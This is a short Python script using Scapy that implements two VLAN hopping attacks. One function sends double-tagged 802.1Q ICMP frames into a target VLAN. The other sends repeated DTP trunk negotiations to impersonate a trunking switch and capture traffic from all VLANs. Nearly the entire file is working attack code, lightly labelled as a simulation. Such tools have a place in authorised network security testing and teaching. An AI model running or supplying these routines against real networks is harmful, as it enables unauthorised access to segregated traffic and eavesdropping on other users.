#!usr/bin/env python
import sys
from scapy.all import *
from scapy.contrib import dtp
import time





# Sending a double tagged ICMP request
def DoubleTagging(Ip,Interface,MacDestAdd,TargetVlanTag):
    print "The VlanAttack attack is initiating %s" %Ip

    sendp(Ether(dst=MacDestAdd)/Dot1Q(vlan=1)/Dot1Q(vlan=TargetVlanTag)/
                    IP(dst=Ip)/ICMP(),iface=Interface,verbose=0)

   
    return 0



# Simulate the VLAN spoofing attack by sending multiple DTP (Dynamic Trunking Protocol) Packets
#  in order to impersonate a trunking switch and to form a trunk link and gain traffic from all VLANs
def Spoofing(Ip,Interface,MacDestAdd,TargetVlanTag):
    dtp.negotiate_trunk(iface=Interface,verbose=0)
    time.sleep(1)
    dtp.negotiate_trunk(iface=Interface,verbose=0)
    time.sleep(1)
    dtp.negotiate_trunk(iface=Interface,verbose=0)
    time.sleep(30)
    dtp.negotiate_trunk(iface=Interface,verbose=0)


    return 0




